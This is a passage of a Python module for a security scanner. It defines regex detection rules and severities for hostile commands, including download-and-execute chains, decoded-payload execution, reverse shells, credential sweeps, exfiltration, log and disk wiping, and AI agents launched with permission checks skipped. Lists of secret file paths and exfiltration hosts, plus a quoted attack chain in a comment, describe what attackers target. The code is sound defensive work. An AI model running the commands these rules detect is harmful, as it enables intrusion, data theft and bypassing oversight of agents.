"""Content and command rules.

Every pattern has a severity per context:
  autoexec  code that runs on its own when a repo is opened, set up or installed (hooks, install scripts, setup.py,
            conftest.py, build.rs, folder-open tasks, and files those reference); also commands an agent is about to run
  code      other source files
  doc       documentation and instruction files (people and agents follow these)
  config    structured configuration
A severity of None means the pattern is not reported in that context.
"""
from __future__ import annotations

import re
import time
from dataclasses import dataclass

from .campaigns import campaign_shapes
from .codectx import (EXEC_ON_LINE, REGEX_LIKE, after_trailing_comment, data_string, enclosing_string, first_near,
                      has, in_other_string, line_window, named_in_string)
from .collector import Collector
from .content_rules import (R_AGENT_BYPASS, R_AGENT_CFG_WRITE, R_AI_ADDRESSED, R_BIDI, R_CONDITIONAL, R_DECODE_EXEC,
                            R_DESTRUCTIVE, R_DISGUISED_RUN, R_DOWNLOAD_EXEC, R_ENV_DUMP, R_EXFIL, R_EXFIL_HOST,
                            R_FAKE_PROMPT, R_HIDDEN_COMMENT, R_ATTACK_TOOL, R_INLINE_NET, R_LOG_WIPE, R_LOLBIN, R_LONG_LINE, R_NET_AUTO,
                            R_OBFUSCATED, R_PAD_LINES, R_PAD_SPACES, R_PERSIST, R_QUARANTINE, R_REGISTRY,
                            R_REVERSE_SHELL, R_SECRETS, R_SELECTORS, R_SELF_PUBLISH, R_SWEEP, R_TAGS, R_TERMINAL, R_URL_INSTALL, R_ZERO_WIDTH)
from .deobfuscate import (_DOC_HOST, DEOBF_HINT, FOLD_LIMIT, SPLIT_HINT, decoded_items, deobfuscate, is_sensitive,
                          needed_decoding, placeholder_url)
from .hosts import URL, classify_host, host_kind, host_of
from .indicators import EXFIL_HOSTS, RAW_IP_URL, SECRET_PATHS, WRITE_OP, is_private_ip  # noqa: F401
from .model import Finding, bump, clip, rank
from .policy import is_test_code
from .text import FILLERS, decode_blobs, in_comment, in_string_literal, invisible, long_lines, padding


TERMINAL_HIDE = re.compile("\x1b\\[(?:8m|[0-2]?K|\\d*[AF]|2J)")


@dataclass
class Pattern:
    rule: str
    regex: re.Pattern
    sev: dict
    message: str
    need: tuple[str, ...] = ()  # lowercase substrings one of which must be present; a cheap check before the regex


def S(autoexec=None, code=None, doc=None, config=None) -> dict:
    return {"autoexec": autoexec, "code": code, "doc": doc, "config": config}


def _p(rule_id: str, regex: str, sev: dict, message: str, flags: int = re.I) -> Pattern:
    return Pattern(rule_id, re.compile(regex, flags), sev, message)


SHELLS = r"(?:ba|z|da|k|fi|c)?sh"
FETCH = r"(?:curl|wget)(?:\.exe)?"
PS_FETCH = (r"(?:iwr|irm|Invoke-WebRequest|Invoke-RestMethod|New-Object\s+(?:System\.)?Net\.WebClient|"
            r"\.DownloadString\s*\(|\.DownloadFile\s*\(|Start-BitsTransfer)")

COMMAND_PATTERNS = [
    _p(R_DOWNLOAD_EXEC, rf"\b{FETCH}\b[^\n|;&]{{0,400}}\|\s*(?:sudo\s+(?:-\S+\s+)*)?{SHELLS}\b",
       S("critical", "high", "doc", "high"), "pipes a download into a shell"),
    _p(R_DOWNLOAD_EXEC, rf"\b{FETCH}\b[^\n|;&]{{0,400}}\|\s*(?:sudo\s+)?(?:python[0-9.]*|node|perl|ruby|php|pwsh|powershell)\b",
       S("critical", "high", "doc", "high"), "pipes a download into an interpreter"),
    _p(R_DOWNLOAD_EXEC, rf"\b{SHELLS}\s+(?:-c\s+)?[\"']?\$\(\s*{FETCH}\b", S("critical", "high", "doc", "high"),
       "runs the output of a download"),
    _p(R_DOWNLOAD_EXEC, rf"(?:\bsource|\b{SHELLS})\s+<\(\s*{FETCH}\b", S("critical", "high", "doc", "high"),
       "sources a download"),
    _p(R_DOWNLOAD_EXEC, rf"{PS_FETCH}[^\n]{{0,400}}?\|\s*(?:iex|Invoke-Expression)\b",
       S("critical", "high", "doc", "high"), "pipes a download into Invoke-Expression"),
    _p(R_DOWNLOAD_EXEC, rf"\b(?:iex|Invoke-Expression)\b\s*\(?\s*(?:\(\s*)*{PS_FETCH}",
       S("critical", "high", "doc", "high"), "Invoke-Expression on a download"),
    _p(R_DOWNLOAD_EXEC, rf"\b{FETCH}\b[^\n;&|]{{0,300}}\s(?:-o|-O|--output|--output-document)\s*\S+[^\n]{{0,80}}?(?:&&|;|&)\s*"
       r"(?:sudo\s+)?(?:chmod\s+\+x|\./|/tmp/|start\b|call\b|\S+\.(?:exe|bat|cmd|ps1|vbs|hta|msi)\b|(?:ba|z)?sh\s"
       r"|(?:node|bun|deno|python[0-9.]*|perl|ruby|php)\s+\S)",
       S("critical", "high", "doc", "high"), "downloads a file and runs it"),
    # Through a decoder on the way (the Paperclip skill clones, Aug 2026: curl -k ... | base64 -d > /tmp/t.mjs && node
    # /tmp/t.mjs), or written with a redirect instead of -o.
    # No installer decodes what it downloads before running it: these are high wherever they are written.
    _p(R_DOWNLOAD_EXEC, rf"\b{FETCH}\b[^\n;&]{{0,400}}?\|\s*(?:base64|gunzip|gzip|zcat|xxd|openssl|bzip2|xz|tr|rev)\b"
       rf"[^\n;&]{{0,120}}\|\s*(?:sudo\s+)?(?:{SHELLS}|python[0-9.]*|node|bun|deno|perl|ruby|php|pwsh|powershell)\b",
       S("critical", "high", "high", "high"), "pipes a decoded download into a shell or interpreter"),
    _p(R_DOWNLOAD_EXEC, rf"\b{FETCH}\b[^\n;&]{{0,400}}?\|\s*(?:base64|gunzip|gzip|zcat|xxd|openssl|bzip2|xz|tr|rev)\b"
       rf"[^\n;&]{{0,120}}?>\s*['\"]?(\S+?)['\"]?\s*(?:&&|;)\s*(?:sudo\s+)?(?:chmod\s+\+x\s+\S+\s*(?:&&|;)\s*)?"
       rf"(?:node|bun|deno|python[0-9.]*|perl|ruby|php|{SHELLS}|pwsh|powershell)\s+['\"]?\1\b",
       S("critical", "high", "high", "high"), "decodes a download into a file and runs it"),
    _p(R_DOWNLOAD_EXEC, rf"\b{FETCH}\b[^\n;&]{{0,400}}?>\s*['\"]?(\S+?)['\"]?\s*(?:&&|;)\s*(?:sudo\s+)?(?:chmod\s+\+x\s+\S+\s*(?:&&|;)\s*)?"
       rf"(?:node|bun|deno|python[0-9.]*|perl|ruby|php|{SHELLS}|pwsh|powershell)\s+['\"]?\1\b",
       S("critical", "high", "doc", "high"), "downloads to a file and runs it"),
    _p(R_DOWNLOAD_EXEC, r"\bexec\s*\(\s*(?:urllib\.request\.)?urlopen\s*\(|\bexec\s*\(\s*requests\.get\s*\(",
       S("critical", "high", "high", "high"), "executes a downloaded Python payload"),
    _p(R_DOWNLOAD_EXEC, r"(?s)(?:Command::new|subprocess\.(?:run|call|Popen|check_call|check_output)|spawnSync|execFileSync|"
       r"\bspawn|\bexecFile)\s*\(\s*\[?\s*['\"](?:curl|wget)(?:\.exe)?['\"].{0,600}?(?:Command::new|subprocess\.(?:run|call|"
       r"Popen|check_call|check_output)|spawnSync|execFileSync|\bspawn|\bexecFile)\s*\(\s*\[?\s*['\"](?:sh|bash|zsh|cmd|"
       r"powershell|pwsh|python[0-9.]*|node|chmod)['\"]", S("critical", "high", None, "high"),
       "spawns a downloader, then a shell or interpreter"),
    _p(R_DECODE_EXEC, r"\beval\s*\(\s*(?:atob|unescape|decodeURIComponent|Buffer\.from|String\.fromCharCode)\s*\(",
       S("critical", "high", "high", "high"), "evaluates decoded data"),
    _p(R_DECODE_EXEC, r"\bnew\s+Function\s*\([^\n]{0,200}(?:atob|Buffer\.from|fromCharCode|base64)",
       S("critical", "high", "high", "high"), "builds a function from decoded data"),
    # `import base64 as b; exec(b.b64decode(...))`: the module may be renamed, so any prefix counts
    _p(R_DECODE_EXEC, r"\b(?:exec|eval)\s*\(\s*(?:(?:[A-Za-z_]\w*\.)?(?:b64decode|b32decode|b85decode|a85decode|decodebytes|"
       r"decompress|unhexlify|fromhex)\s*\(|marshal\.loads|codecs\.decode|"
       r"__import__\(\s*['\"](?:base64|zlib|marshal|codecs|binascii)['\"]\s*\))",
       S("critical", "high", "high", "high"), "executes decoded Python"),
    _p(R_DECODE_EXEC, r"\b(?:exec|eval)\s*\([^\n]{0,120}?\.decrypt\s*\(", S("critical", "high", "high", "high"),
       "executes decrypted code"),
    # `os.system(b64d("..."))`: whatever the helper is called, its output from an encoded literal is run
    _p(R_DECODE_EXEC, r"\b(?:os\.system|os\.popen|subprocess\.(?:run|call|Popen|check_output|check_call|getoutput)|exec|"
       r"eval|execSync)\s*\(\s*[A-Za-z_$][\w$.]*\(\s*[bru]?['\"][A-Za-z0-9+/=_-]{24,}['\"]\s*\)",
       S("critical", "high", "medium", "high"), "runs what a decoder makes of an encoded string"),
    # Searching the folders that hold credentials for the words credentials contain. Searching the project is
    # ordinary; dot-folders in the home folder, /etc and the whole home are where an agent has no reason to look.
    _p(R_SWEEP, r"\b(?:grep|egrep|rg|ag|ack|findstr|Select-String)\b[^\n|;&]{0,160}?\b(?:tokens?|passw(?:or)?ds?|secrets?|"
       r"api[_-]?keys?|credentials?|aws_access_key_id|private[_ ]?keys?)\b[^\n|;&]{0,160}?(?:(?:~|\$HOME|\$\{HOME\})"
       r"(?:/\.[\w.-]+|(?=[\s'\"]|$))|(?<![\w.])/etc\b|(?<![\w.])/root\b|/\.(?:config|ssh|aws|gnupg|kube|docker|azure)\b)"
       r"|\bfind\s+(?:~|\$HOME|\$\{HOME\}|/home|/Users|/root|/)(?:\s|/[^\s]*\s)[^\n|;&]{0,160}?-i?name\s+['\"]?\*?"
       r"(?:\.pem|\.key|id_rsa\*?|id_ed25519\*?|\.env|\*?credential\w*\*?|\.kdbx|\.npmrc|\.git-credentials)\b",
       S("high", "medium", "low", "high"), "searches credential folders for passwords, tokens or keys"),
    _p(R_ATTACK_TOOL, r"\b(?:mimikatz|lazagne|rubeus|sharphound|linpeas|winpeas|linux-exploit-suggester|pspy(?:32|64)s?|"
       r"meterpreter|cobaltstrike|mimipenguin|nanodump|safetykatz)\b", S("high", "medium", "low", "high"),
       "fetches or runs an attack tool"),
    _p(R_DECODE_EXEC, r"\bexec\s*\(\s*compile\s*\((?![^\n]{0,200}?(?:\.read\(\)|read_text\(\)|\bopen\())",
       S("medium", "low", "low", "low"), "executes a compiled string"),
    _p(R_DECODE_EXEC, r"\b(?:exec|eval)\s*\(\s*[A-Za-z_]\w*\.decode\s*\(",
       S("high", "medium", "medium", "medium"), "executes a decoded string"),
    _p(R_DECODE_EXEC, r"\bmarshal\.loads\s*\(", S("high", "medium", None, "medium"), "loads marshalled bytecode"),
    _p(R_DECODE_EXEC, r"FromBase64String\s*\([^\n]{0,400}(?:\biex\b|Invoke-Expression)|(?:\biex\b|Invoke-Expression)"
       r"[^\n]{0,200}FromBase64String", S("critical", "high", "high", "high"), "runs base64-decoded PowerShell"),
    _p(R_DECODE_EXEC, r"\b(?:powershell|pwsh)(?:\.exe)?\b[^\n]{0,120}\s[-/](?:e|ec|en|enc\w*)\s+[A-Za-z0-9+/]{20,}={0,2}",
       S("critical", "high", "high", "high"), "runs an encoded PowerShell command"),
    _p(R_DECODE_EXEC, rf"\bbase64\s+(?:-d|--decode|-D)\b[^\n]{{0,120}}\|\s*{SHELLS}\b|\|\s*base64\s+(?:-d|--decode|-D)\s*\|\s*{SHELLS}\b"
       rf"|\bxxd\s+-r\s+-p\b[^\n]{{0,120}}\|\s*{SHELLS}\b", S("critical", "high", "high", "high"),
       "pipes decoded data into a shell"),
    _p(R_DECODE_EXEC, r"\brequire\(\s*['\"](?:node:)?vm['\"]\s*\)\s*\.\s*run(?:InNewContext|InThisContext|InContext)\s*\(",
       S("high", "low", None, None), "runs code through the vm module"),
    _p(R_AGENT_BYPASS, r"\bclaude\b[^\n]{0,200}(?:--dangerously[-_]skip[-_]permissions|--allow[-_]dangerously[-_]skip[-_]permissions"
       r"|--permission-mode[ =]+bypass[Pp]ermissions)", S("critical", "medium", "medium", "high"),
       "starts Claude Code with permission checks skipped"),
    _p(R_AGENT_BYPASS, r"\bgemini\b[^\n]{0,200}(?:--yolo\b|--approval-mode[ =]+yolo)", S("critical", "medium", "medium", "high"),
       "starts Gemini CLI in YOLO mode"),
    _p(R_AGENT_BYPASS, r"\bcodex\b[^\n]{0,200}(?:--dangerously[-_]bypass[-_]approvals[-_]and[-_]sandbox|--yolo\b)",
       S("critical", "medium", "medium", "high"), "starts Codex with approvals and sandbox off"),
    _p(R_AGENT_BYPASS, r"\bq\s+chat\b[^\n]{0,200}--trust-all-tools|\bcopilot\b[^\n]{0,200}--allow-all-tools|"
       r"\bcursor-agent\b[^\n]{0,200}\s(?:--force|-f)\b|\baider\b[^\n]{0,200}--yes-always",
       S("critical", "medium", "medium", "high"), "starts an AI agent that approves every tool call"),
    _p(R_LOLBIN, r"\bmshta(?:\.exe)?[ \t]+[\"']?(?:https?:|vbscript:|javascript:|\\\\)", S("critical", "high", "high", "high"),
       "mshta runs remote script"),
    _p(R_LOLBIN, r"\brundll32(?:\.exe)?[ \t]+[\"']?\\\\|\brundll32(?:\.exe)?[ \t]+[^\n]{0,80}javascript:",
       S("critical", "high", "high", "high"), "rundll32 loads a DLL over the network"),
    _p(R_LOLBIN, r"\bregsvr32(?:\.exe)?[ \t]+[^\n]{0,80}/i:\s*https?:|\bcertutil(?:\.exe)?[ \t]+[^\n]{0,80}-urlcache\b|"
       r"\bbitsadmin(?:\.exe)?[ \t]+[^\n]{0,80}/transfer\b|\bwmic(?:\.exe)?[ \t]+[^\n]{0,80}process[ \t]+call[ \t]+create\b|"
       r"(?<![\w.-])(?:cscript|wscript)(?:\.exe)?[ \t]+[^\n]{0,80}(?:https?:|\\\\)|\bmsiexec(?:\.exe)?[ \t]+[^\n]{0,40}/i[ \t]*https?:",
       S("critical", "high", "high", "high"), "uses a Windows system binary to fetch or run remote code"),
    _p(R_QUARANTINE, r"\bxattr\s+(?:-[a-z]*c\b|-[a-z]*d\s+com\.apple\.quarantine)|\bspctl\s+--master-disable\b",
       S("high", "medium", "medium", "high"), "removes the macOS quarantine flag"),
    _p(R_QUARANTINE, r"\bchmod\s+\+x\s+[\"']?/tmp/[^\n]{0,120}(?:&&|;)\s*[\"']?/tmp/",
       S("high", "medium", "medium", "high"), "makes a file in /tmp executable and runs it"),
    _p(R_INLINE_NET, r"\b(?:python[0-9.]*|py)\s+-c\s+[\"'][^\n]{0,400}(?:urllib\.request|urlopen|requests\.(?:get|post|put|request|"
       r"Session)|socket\.(?:socket|create_connection)|http\.client|httpx\.)",
       S("high", "medium", "medium", "high"), "python -c with network access"),
    _p(R_INLINE_NET, r"\bnode\s+-e\s+[\"'][^\n]{0,400}(?:https?\.(?:get|request)|fetch\(|net\.connect|child_process)",
       S("high", "medium", "medium", "high"), "node -e with network or process access"),
    _p(R_INLINE_NET, r"\b(?:powershell|pwsh)(?:\.exe)?\s+[^\n]{0,80}-(?:c|command)\s+[^\n]{0,400}"
       r"(?:Invoke-WebRequest|\biwr\b|\birm\b|Net\.WebClient|DownloadString|DownloadFile)",
       S("high", "medium", "medium", "high"), "PowerShell one-liner with a download"),
    _p(R_FAKE_PROMPT, r"osascript[^\n]{0,300}display\s+dialog[^\n]{0,300}(?:password|passwd)[^\n]{0,300}hidden\s+answer|"
       r"\bdscl\s+\.\s+-authonly\b", S("critical", "high", "high", "high"), "asks for your password in a fake dialog"),
    _p(R_REVERSE_SHELL, r"\bbash\s+-i\s+>&\s*/dev/tcp/|/dev/tcp/[\w.-]+/\d+|\bnc(?:at)?\b[^\n]{0,60}\s-e\s+(?:/bin/)?(?:ba)?sh\b|"
       r"\bsocat\b[^\n]{0,100}\bexec:|import\s+socket\s*,\s*subprocess\s*,\s*os", S("critical", "critical", "high", "critical"),
       "opens a reverse shell"),
    # The trojanized Claude Code extension (Oct 2026) switched on the SSH server and held a reverse tunnel to port 22.
    _p(R_REVERSE_SHELL, r"\b(?:auto)?ssh\b[^\n]{0,160}\s-R\s*['\"]?(?:\*:)?\d+:(?:localhost|127\.0\.0\.1):22\b"
       r"|\bsystemsetup\s+-setremotelogin\s+on\b|\bAdd-WindowsCapability\b[^\n]{0,80}OpenSSH\.Server",
       S("critical", "high", "medium", "high"), "opens remote access to this machine (SSH server or reverse tunnel)"),
    _p(R_DESTRUCTIVE, r"\brm\s+-[a-z]*(?:rf|fr)[a-z]*\s+(?:--no-preserve-root\s+)?(?:/(?:\s|$|\*)|~/?(?:\s|$|\*)|\$HOME/?(?:\s|$|\*)|\$\{HOME\}|/\*)|"
       r"\bdel\s+/[sfq]\s+/[sfq]\b[^\n]{0,40}(?:[A-Za-z]:\\|%USERPROFILE%)|\bformat\s+[a-z]:\s*/[qy]|"
       r"\bRemove-Item\b[^\n]{0,100}-Recurse[^\n]{0,100}(?:\$env:USERPROFILE|[A-Z]:\\\s|~[\\/]?\s)|"
       r"\bdd\s+if=/dev/(?:zero|u?random)\s+of=/dev/[sh]d",
       S("critical", "high", "medium", "high"), "deletes a home directory, drive or disk"),
    _p(R_LOG_WIPE, r"\b(?:rm|unlink|shred|truncate|srm|wipe)\b[^\n;&|]{0,200}?(?:/var/log(?:/|\b)|\baudit\.log\b|"
       r"\.(?:ba|z)sh_history\b|\b(?:wtmp|btmp|lastlog|utmp)\b|/journal/|\bauth\.log\b|\bsyslog\b|ConsoleHost_history)"
       r"|(?:^|[;&|]\s*|\s)(?::\s*)?>\s*['\"]?[^\s'\"]*(?:/var/log/[^\s'\"]+|audit\.log|\.(?:ba|z)sh_history)"
       r"|\bhistory\s+-c\b|\bunset\s+HISTFILE\b|\bHISTFILE=/dev/null\b|\bexport\s+HISTSIZE=0\b|\bset\s+\+o\s+history\b"
       r"|\bauditctl\s+-(?:D\b|e\s*0\b)|\b(?:systemctl|service)\s+(?:stop|disable|mask)\s+(?:auditd|rsyslog|syslog|"
       r"systemd-journald|journald)\b|\bservice\s+(?:auditd|rsyslog|syslog)\s+stop\b|\bwevtutil(?:\.exe)?\s+cl\b"
       r"|\bClear-EventLog\b", S("high", "low", "low", "high"), "deletes or silences logs"),
    # Staging a program to run: fetch it to a file, then mark that same file executable (the privilege-escalation
    # toolkits linpeas, les.sh and pspy arrive this way).
    _p(R_DOWNLOAD_EXEC, rf"\b{FETCH}\b[^\n;&|]{{0,300}}?(?:\s(?:-[a-zA-Z]*[oO]|--output|--output-document)[= ]?\s*|\s>\s*)"
       r"['\"]?([^\s'\";&|>]+)['\"]?[^\n]{0,200}?(?:&&|;|\n)\s*(?:sudo\s+)?chmod\s+(?:-\S+\s+)*"
       r"(?:[ugoa]*\+[rwX]*x[rwX]*|[0-7]*[1357][0-7]*)\s+['\"]?\1(?![\w./-])",
       S("medium", "low", "low", "medium"), "downloads a program and makes it executable"),
    # curl's flags are case-sensitive: -f is --fail, -F is --form; -d is data, -D dumps headers; -T uploads, -t is telnet.
    _p(R_EXFIL, r"\b(?:curl|wget)(?:\.exe)?\b[^\n|;&]{0,300}?(?-i:\s(?:-d|--data(?:-binary|-raw|-urlencode)?|-F|--form|-T|"
       r"--upload-file|--post-data|--post-file)\b|\s-X\s*POST\b)[^\n|;&]{0,300}https?://"
       r"|\b(?:curl|wget)(?:\.exe)?\b[^\n|;&]{0,300}?https?://[^\n|;&]{0,300}(?-i:\s(?:-d|--data(?:-binary|-raw|-urlencode)?|-F|"
       r"--form|-T|--upload-file|--post-data|--post-file)\b)"
       r"|\bInvoke-(?:WebRequest|RestMethod)\b[^\n]{0,300}-(?:Method\s+Post|Body|InFile)\b",
       S("high", None, None, "high"), "sends data to a remote host"),
    _p(R_URL_INSTALL, r"\b(?:npm|pnpm|yarn|bun)\s+(?:i|install|add)\b[^\n]{0,200}\s(?:https?://\S+\.(?:tgz|tar\.gz)|git\+\S+|"
       r"(?:github|gitlab|bitbucket):\S+)|\bpip[0-9.]*\s+install\b[^\n]{0,200}\s(?:https?://\S+|git\+\S+)|"
       r"\bnpx\s+(?:-y\s+|--yes\s+)?(?:https?://|github:|git\+)", S("high", "low", "medium", "medium"),
       "installs from a URL or git"),
    _p(R_DISGUISED_RUN, r"(?<![\w.-])(?:node|nodejs|bun|deno|python[0-9.]*|py|ruby|perl|php|(?:ba|z)?sh|pwsh|powershell|wscript|"
       r"cscript)(?:\.exe)?\s+(?:-[-\w]+\s+)*[\"']?[^\s\"'|;&<>]+\.(?:ttf|otf|woff2?|eot|png|jpe?g|gif|ico|bmp|webp|mp3|mp4|"
       r"m4a|wav|avi|mov|mkv|lkf)[\"']?(?=$|[\s;&|)])", S("critical", "high", "high", "high"),
       "runs a font, image or media file with an interpreter"),
]

_NEEDS = {
    "pipes a download into a shell": ("curl", "wget"), "pipes a download into an interpreter": ("curl", "wget"),
    "runs the output of a download": ("curl", "wget"), "sources a download": ("curl", "wget"),
    "pipes a download into Invoke-Expression": ("iex", "invoke-expression"),
    "Invoke-Expression on a download": ("iex", "invoke-expression"), "downloads a file and runs it": ("curl", "wget"),
    "pipes a decoded download into a shell or interpreter": ("curl", "wget"),
    "decodes a download into a file and runs it": ("curl", "wget"), "downloads to a file and runs it": ("curl", "wget"),
    "executes a downloaded Python payload": ("exec",), "spawns a downloader, then a shell or interpreter": ("curl", "wget"),
    "evaluates decoded data": ("eval",), "builds a function from decoded data": ("function",),
    "executes decoded Python": ("exec", "eval"), "executes a compiled string": ("compile",),
    "executes a decoded string": ("decode",),
    "loads marshalled bytecode": ("marshal",), "runs base64-decoded PowerShell": ("frombase64string",),
    "runs an encoded PowerShell command": ("powershell", "pwsh"), "pipes decoded data into a shell": ("base64", "xxd"),
    "runs code through the vm module": ("vm",), "starts Claude Code with permission checks skipped": ("claude",),
    "starts Gemini CLI in YOLO mode": ("gemini",), "starts Codex with approvals and sandbox off": ("codex",),
    "starts an AI agent that approves every tool call": ("chat", "copilot", "cursor-agent", "aider"),
    "mshta runs remote script": ("mshta",), "rundll32 loads a DLL over the network": ("rundll32",),
    "uses a Windows system binary to fetch or run remote code": ("regsvr32", "certutil", "bitsadmin", "wmic", "cscript",
                                                                 "wscript", "msiexec"),
    "removes the macOS quarantine flag": ("xattr", "spctl"), "makes a file in /tmp executable and runs it": ("chmod",),
    "python -c with network access": ("python", "py "), "node -e with network or process access": ("node",),
    "PowerShell one-liner with a download": ("powershell", "pwsh"), "asks for your password in a fake dialog": ("osascript", "dscl"),
    "opens a reverse shell": ("/dev/tcp", "nc", "socat", "socket"),
    "opens remote access to this machine (SSH server or reverse tunnel)": ("ssh", "setremotelogin", "openssh.server"),
    "deletes a home directory, drive or disk": ("rm ", "del ", "format ", "remove-item", "dd "),
    "sends data to a remote host": ("curl", "wget", "invoke-"), "installs from a URL or git": ("npm", "pnpm", "yarn", "bun", "pip", "npx"),
    "runs a font, image or media file with an interpreter": ("node", "bun", "deno", "py", "ruby", "perl", "php", "sh",
                                                             "pwsh", "powershell", "wscript", "cscript"),
    "deletes or silences logs": ("log", "hist", "audit", "tmp", "journal", "wevtutil"),
    "executes decrypted code": ("decrypt",),
    "searches credential folders for passwords, tokens or keys": ("grep", "rg ", "ag ", "ack", "findstr", "select-string",
                                                                  "find "),
    "runs what a decoder makes of an encoded string": ("system", "popen", "subprocess", "exec", "eval"),
    "fetches or runs an attack tool": ("mimikatz", "lazagne", "rubeus", "sharphound", "linpeas", "winpeas",
                                       "exploit-suggester", "pspy", "meterpreter", "cobaltstrike", "mimipenguin",
                                       "nanodump", "safetykatz"),
    "downloads a program and makes it executable": ("chmod",),
}


for _pat in COMMAND_PATTERNS:
    _pat.need = _NEEDS[_pat.message]


SECRET_NEED = (".ssh", "id_rsa", "id_ed25519", "id_ecdsa", ".aws", "gcloud", "application_default", ".azure", ".kube",
               ".docker", ".git-credentials", ".netrc", "hosts.yml", ".pypirc", ".claude", ".codex", ".gemini", "openclaw",
               ".cline", ".continue", "state.vscdb", ".copilot", "github-copilot", "login data", "cookies", "local state",
               "web data", "key3.db", "key4.db", "logins.json", "wallet.dat", "exodus", "electrum", "nkbihfbeogaeaoehlefnkodbefgpgknn",
               "bfnaelmomeimhlpmgjnjophhpkkoljpa", "keychain", "leveldb", "tdata")
ENV_NEED = ("process.env", "os.environ", "printenv", "env", "getenvironmentvariables")
NET_NEED = ("fetch", "axios", "got", "needle", "superagent", "http", "require(", "from ", "net.", "dns.", "websocket",
            "xmlhttprequest", "requests.", "urllib", "urlopen", "socket.", "httpx", "aiohttp", "curl", "wget", "nslookup", "dig ",
            "nc ", "invoke-", "iwr ", "irm ", "webclient", "bitstransfer", "reqwest", "ureq", "tcpstream", "command::new")
EXFIL_NEED = ("webhook.site", "requestbin", "pipedream", "oast.", "interact.sh", "burpcollaborator", "oastify", "ngrok",
              "trycloudflare", "pastebin", "transfer.sh", "file.io", "0x0.st", "temp.sh", "duckdns", "ddns.net", "no-ip", "serveo",
              "loca.lt", "beeceptor", "hookbin", "requestcatcher", "ipinfo.io", "ipify", "ifconfig.me", "discord", "api.telegram.org")
PERSIST_NEED = ("bashrc", "zshrc", "bash_profile", "zprofile", "zshenv", "profile", "bash_login", "launchagents", "launchdaemons",
                "launchctl", "schtasks", "scheduledtask", "\\run", "startup", "crontab", "/etc/cron", "/var/spool/cron", "systemctl",
                "systemd", "autostart")
AGENT_NEED = (".claude", "claude.md", "claude.local.md", "agents.md", "agents.override.md", "gemini.md", ".cursor", ".codex",
              ".gemini", ".mcp.json", "openclaw.json", "soul.md", ".vscode", "claude_desktop_config", ".windsurfrules", ".clinerules",
              "copilot-instructions", ".git/hooks", ".git\\hooks", "hookspath")
AI_NEED = ("ignore", "disregard", "forget", "override", "note", "message", "attention", "instruction", "assistant", "agent",
           "scanner", "reviewer", "auditor", "tool", "model", "analy", "this ", "the following", "the code below", "do not",
           "don't", "dont", "without")
SECRET_SEV = S("high", "low", None, "low")

ENV_DUMP = re.compile(
    r"JSON\.stringify\(\s*(?:\{\s*\.\.\.\s*)?process\.env\s*\}?\s*[,)]"
    r"|json\.dumps\(\s*(?:dict\(\s*)?os\.environ|str\(\s*os\.environ\s*\)|repr\(\s*os\.environ\s*\)"
    r"|\bprintenv\b(?![ \t]+\w)|(?-i:(?:^|(?<=[\s;&|(`$]))env[ \t]*(?:>[ \t]*[\w./~$\"'-]|\|[ \t]*(?:grep|curl|wget|base64|nc|"
    r"ncat|tee|sort|awk|sed|xargs|gzip|bzip2|openssl|jq|python3?|node|perl|ruby)\b))"
    r"|Get-ChildItem\s+env:|\bgci\s+env:|\[Environment\]::GetEnvironmentVariables\(\)", re.I | re.M)
ENV_SEV = S("medium", "low", None, "medium")

NETWORK = re.compile(
    r"\b(?:fetch|axios(?:\.(?:get|post|put|request))?|got(?:\.(?:get|post))?|needle|superagent)\s*\("
    r"|\bhttps?\.(?:request|get)\s*\(|\brequire\(\s*['\"](?:node:)?(?:https?|net|dns|tls|dgram)['\"]\s*\)"
    r"|\bfrom\s+['\"](?:node:)?(?:https?|net|dns)['\"]|\bnet\.(?:connect|createConnection)\s*\(|\bdns\.(?:lookup|resolve\w*)\s*\("
    r"|new\s+WebSocket\s*\(|\bXMLHttpRequest\b|\brequests\.(?:get|post|put|request)\s*\(|\burllib\.request\b|\burlopen\s*\("
    r"|\bhttp\.client\.HTTPS?Connection\s*\(|\bsocket\.(?:socket|create_connection|gethostbyname)\s*\(|\bhttpx\.(?:get|post|Client|AsyncClient)\b"
    r"|\baiohttp\.ClientSession\b|\b(?:curl|wget)(?:\.exe)?\s+\S|\bnslookup\b|\bdig\s+\S|\bnc\s+-?\w*\s*[\w.$-]+\s+\d+"
    r"|\bInvoke-(?:WebRequest|RestMethod)\b|\b(?:iwr|irm)\s+\S|Net\.WebClient|Start-BitsTransfer"
    r"|\breqwest::|\bureq::|std::net::TcpStream|Command::new\(\s*\"(?:curl|wget)\"|\bhttp\.(?:Get|Post)\s*\(", re.I)

SEND_DATA = re.compile(
    r"method\s*:\s*['\"]POST['\"]|\breq(?:uest)?\.write\s*\(|(?<!\bres)(?<!\bresponse)(?<!\breply)\.end\s*\(\s*[\w.$]+\s*\)"
    r"|\bnavigator\.sendBeacon\s*\("
    r"|\b(?:axios|got|needle|superagent|request|ky)\.post\s*\(|\bfetch\s*\([^)]{0,300}method\s*:\s*['\"](?:POST|PUT)['\"]"
    r"|\brequests\.(?:post|put)\s*\(|\burlopen\s*\([^)]{0,300}\bdata\s*=|urllib\.request\.Request\s*\([^)]{0,300}\bdata\s*="
    r"|\.request\s*\(\s*['\"](?:POST|PUT)['\"]|\bhttpx\.(?:post|put)\s*\(|\bInvoke-(?:WebRequest|RestMethod)\b[^\n]{0,200}-(?:Method\s+Post|Body)"
    r"|\b(?:curl|wget)\b[^\n]{0,300}(?-i:\s-X\s*POST\b|\s(?:-d|--data(?:-binary|-raw)?|-F|--form|-T|--upload-file|--post-data)\b)"
    r"|\bdns\.(?:lookup|resolve\w*)\s*\([^)]{0,200}\+|\bnslookup\s+[^\n]{0,80}\$", re.I)
DOWNLOAD_THEN_RUN = re.compile(
    r"(?s)\b(?:curl|wget)\b[^\n]{0,300}?\s(?:-o|-O|--output|--output-document)\s*[\"']?([\w./~$-]{2,120})[\"']?"
    r".{0,600}?(?:chmod\s+(?:\+x|[0-7]{3,4})\s+[\"']?(?:\./)?\1|(?<![\w/])\./\1\b|\b(?:ba|z)?sh\s+[\"']?\1|\bexec\s+[\"']?\1)")

PERSIST = re.compile(
    r"(?:(?<![-=<])>>?|\btee\s+-a)\s*[\"']?(?:~|\$HOME|\$\{HOME\}|%USERPROFILE%)?[\\/]?\.(?:bashrc|zshrc|bash_profile|zprofile|zshenv|profile|bash_login)\b"
    r"|\b(?:appendFile|writeFile|appendFileSync|writeFileSync)\s*\([^\n]{0,200}\.(?:bashrc|zshrc|bash_profile|zprofile|profile)\b"
    r"|open\([^\n]{0,200}\.(?:bashrc|zshrc|bash_profile|zprofile|profile)['\"][^\n]{0,40}['\"]a"
